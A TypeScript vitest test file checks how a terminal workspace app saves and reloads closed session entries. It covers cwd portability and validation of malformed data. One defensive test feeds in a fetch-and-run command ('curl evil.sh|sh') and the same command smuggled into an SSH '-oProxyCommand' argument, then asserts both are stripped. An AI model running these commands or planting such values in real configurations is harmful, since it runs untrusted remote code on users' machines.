import { describe, it, expect } from 'vitest'
import { projectToFile, fileToProject, validClosedSessions } from './workspace-files'
import type { ClosedSessionEntry, Project } from '../shared/types'

const closedEntry = (id: string, over: Partial<ClosedSessionEntry['node']> = {}): ClosedSessionEntry => ({
  id,
  closedAt: 1000,
  node: {
    id: 'term-1', kind: 'terminal', position: { x: 0, y: 0 }, size: { width: 400, height: 300 },
    title: 'shell', color: '#fff', group: null, cwd: '/tmp/x', ...over
  },
  absolutePosition: { x: 0, y: 0 }
})

const project = (over: Partial<Project> = {}): Project => ({
  id: 'p1', name: 'foo', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 }, nodes: [], ...over
})

describe('closedSessions round trip', () => {
  it('projectToFile omits an absent/empty closedSessions', () => {
    const file = projectToFile(project(), 1, 'now')
    expect(file.closedSessions).toBeUndefined()
  })

  it('round-trips id/closedAt/cosmetic fields, portable-izing cwd under the project root', () => {
    const entries = [closedEntry('e1'), closedEntry('e2')]
    const file = projectToFile(project({ cwd: '/tmp/x', closedSessions: entries }), 1, 'now')
    // The FILE stores a portable cwd, same as a live node's would — never the absolute path.
    expect(file.closedSessions?.[0].node.cwd).toBe('.')
    expect(file.closedSessions?.map((e) => e.id)).toEqual(['e1', 'e2'])

    const loaded = fileToProject(file, { id: 'p1', cwd: '/tmp/x' })
    // Resolved back to absolute against THIS load's cwd — round-trips to the original.
    expect(loaded.closedSessions?.[0].node.cwd).toBe('/tmp/x')
    expect(loaded.closedSessions?.[0].node.title).toBe('shell')
    expect(loaded.closedSessions?.[0].closedAt).toBe(1000)
  })

  it('strips shell and ssh.extraArgs/execTrusted from the file, never restoring them without a local record', () => {
    const dangerous = closedEntry('e1', {
      shell: 'curl evil.sh|sh',
      ssh: { host: 'h', user: 'u', extraArgs: ['-oProxyCommand=curl evil.sh|sh'], execTrusted: true } as never
    })
    const file = projectToFile(project({ closedSessions: [dangerous] }), 1, 'now')
    expect(file.closedSessions?.[0].node.shell).toBeUndefined()
    expect((file.closedSessions?.[0].node.ssh as { extraArgs?: unknown })?.extraArgs).toBeUndefined()
    expect((file.closedSessions?.[0].node.ssh as { execTrusted?: unknown })?.execTrusted).toBeUndefined()

    // No matching entry in this machine's localExec map ⇒ stays stripped on read too.
    const loaded = fileToProject(file, { id: 'p1' })
    expect(loaded.closedSessions?.[0].node.shell).toBeUndefined()
    expect((loaded.closedSessions?.[0].node.ssh as { extraArgs?: unknown })?.extraArgs).toBeUndefined()
  })

  it('fileToProject drops a missing or malformed closedSessions to undefined', () => {
    const file = projectToFile(project(), 1, 'now')
    const loaded = fileToProject(file, { id: 'p1', cwd: '/tmp/x' })
    expect(loaded.closedSessions).toBeUndefined()

    const malformed = { ...file, closedSessions: { not: 'an array' } } as never
    expect(fileToProject(malformed, { id: 'p1', cwd: '/tmp/x' }).closedSessions).toBeUndefined()
  })

  it('validClosedSessions accepts a well-formed array and rejects garbage', () => {
    expect(validClosedSessions([closedEntry('e1')])).toBe(true)
    expect(validClosedSessions([{ id: 'e1' }])).toBe(false) // missing closedAt/node
    expect(validClosedSessions('nope')).toBe(false)
    expect(validClosedSessions(undefined)).toBe(false)
  })
})
